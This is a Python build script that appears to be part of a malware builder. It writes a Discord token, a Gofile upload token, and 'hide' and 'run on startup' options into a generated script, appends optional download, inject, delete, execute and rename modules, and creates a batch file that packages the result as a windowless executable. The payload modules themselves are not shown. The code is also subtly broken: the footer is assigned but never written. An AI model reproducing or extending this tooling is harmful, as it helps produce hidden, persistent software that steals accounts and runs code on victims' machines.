# compile.py
import json
import py_compile
from pathlib import Path
from gui.compiler import code
from gui.commands.settingCommands import settingCommands

class Compile:
    def __init__(self, token, api, hide, startup, name, fileType):
        self.name = name
        self.config=code.codeBase().getConfig(token,api,hide,startup)
        self.fileType = fileType
        self.settings = settingCommands()
        self.base_template = code.codeBase().getBase()
        self.rename = code.rename
        self.download = code.download
        self.execute = code.execute
        self.inject = code.inject
        self.delete = code.delete
        self.footer = code.footer

        self.runtime_config = {
            "discord token": token,
            "gofile token": api,
            "hide": hide,
            "run on startup": startup
        }

    def Compiler(self):
        print("compiling...")

        #  Create build folder
        build_dir = Path(__file__).resolve().parent / "build"
        build_dir.mkdir(exist_ok=True)

        out_path = build_dir / f"{self.name or 'compiled'}.py"

        #  Write compiled Python file
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(self.config)
            f.write(self.base_template)
            print("base compiled")

            if self.settings.downloadSwitch:
                f.write(self.download)
                print("download compiled")
            if self.settings.injectSwitch:
                f.write(self.inject)
                print("inject compiled")
            if self.settings.deleteSwitch:
                f.write(self.delete)
                print("delete compiled")
            if self.settings.executeSwitch:
                f.write(self.execute)
                print("execute compiled")
            if self.settings.renameSwitch:
                f.write(self.rename)
                print("rename compiled")
            self.footer = code.footer
            print('footer compiled')

        # Syntax check the produced file
        try:
            py_compile.compile(str(out_path), doraise=True)
            print(f"Syntax check passed for {out_path.name}")
        except py_compile.PyCompileError as e:
            print(f"Syntax check FAILED for {out_path.name}")
            print(e)
            return  # stop if syntax invalid

        # If building EXE, create helper batch script
        if self.fileType.lower() == "exe":
            print("Building executable instructions...")

            bat_path = build_dir / "createExecutable.bat"

            # PyInstaller command - one file, no console, cleans build
            bat_contents = f"""@echo off
echo ----------------------------------------
echo Building executable: {self.name}.exe
echo ----------------------------------------

py -m PyInstaller --clean --onefile --noconsole -i NONE "{out_path.name}"

REM Clean up build artifacts
rmdir /s /q __pycache__ >nul 2>nul
rmdir /s /q build >nul 2>nul
del /f /q "{self.name}.spec" >nul 2>nul

echo.
echo  Generated EXE as: dist\\{self.name}.exe
echo.
pause
exit /b 0
"""

            with open(bat_path, "w", encoding="utf-8") as bat:
                bat.write(bat_contents)

            print(f"Wrote build script to {bat_path}")
            print("Run it manually to generate the .exe file.")
